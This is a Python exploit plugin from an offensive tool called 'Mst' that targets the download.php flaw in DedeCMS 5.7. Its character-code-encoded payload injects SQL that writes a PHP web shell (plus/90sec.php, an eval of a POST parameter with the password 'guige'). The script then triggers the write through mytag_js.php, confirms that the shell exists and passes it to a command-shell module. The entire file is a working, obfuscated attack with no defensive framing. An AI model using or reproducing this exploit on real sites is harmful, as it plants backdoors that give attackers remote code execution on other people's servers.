
# -*- coding: cp936 -*-
'''
Mst=>exploit=>dede5.7
vulFile  : download.php
vulAuthor: guige
expAuthor: mst
'''
class mstplugin:
    '''dede5.7_download.php_getshell'''
    infos = [
        ['插件','DEDE5.7_DOWNLOAD.PHP_GETSHELL'],
        ['作者','mst'],
        ['更新','2013/10/20'],
        ['网址','http://mstoor.duapp.com/']
        ]
    opts  = [
        ['RURL','www.dedecms.com','远程URL地址'],
        ['RPATH','/','CMS安装路径'],
        ['RPORT','80','远程URL端口'],
        ['PAYLOAD','php_cmdshell','后攻击插件']
        ]
    def exploit(self):
        if  RPORT == '443':
            url = "https://"+RURL+RPATH
        else:
            url = "http://"+RURL+":"+RPORT+RPATH
        poc   = "plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96"
        check = "plus/mytag_js.php?aid=9013"
        shell = "plus/90sec.php"
        passwd= "guige"
        exp   = url+poc
        check = url+check
        shell = url+shell
        color.cprint("[+] Sending exp...",YELLOW)
        if fuck.urlget(exp).getcode() == 200:
            color.cprint("[+] Check status..",YELLOW)
            if fuck.urlget(check).getcode() == 200:
                color.cprint("[+] Check shell..",YELLOW)
                if fuck.urlget(shell).getcode() == 200:
                    color.cprint("[*] Exploit Successful !",GREEN)
                    color.cprint("[*] Shell : "+shell,CYAN)
                    color.cprint("[*] Passwd: "+passwd,CYAN)
                    fuck.topayload(PAYLOAD,[shell,passwd])
                else:
                    color.cprint("[!] Exploit False ! CODE:%s"%fuck.urlget(shell).getcode(),RED)
            else:
                color.cprint("[!] Check False ! CODE:%s"%fuck.urlget(check).getcode(),RED)
        else:
            color.cprint("[!] TARGET NOT VUL ! CODE:%s"%fuck.urlget(exp).getcode(),RED)
        
        
